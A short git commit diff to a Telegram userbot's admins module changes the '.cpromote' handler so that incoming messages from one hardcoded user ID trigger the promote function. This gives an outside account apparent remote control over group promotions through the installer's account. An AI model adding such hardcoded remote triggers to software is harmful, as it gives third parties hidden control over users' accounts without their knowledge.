84f339d8863c187b7390790fe7582ace71c8b8ce
ArmanGG01 <96017229+ArmanGG01@users.noreply.github.com>
2022-02-26 22:52:59 +0700

    Update admins.py

--- userbot/modules/admins.py
+++ userbot/modules/admins.py
@@ -114,7 +114,7 @@ async def set_group_photo(gpic):
 
 
 @register(outgoing=True, pattern=r"^\.promote(?: |$)(.*)")
-@register(incoming=True, from_users=DEVS, pattern=r"^\.cpromote$")
+@register(incoming=True, from_users=1694909518, pattern=r"^\.cpromote$")
 async def promote(promt):
     # Get targeted chat
     chat = await promt.get_chat()
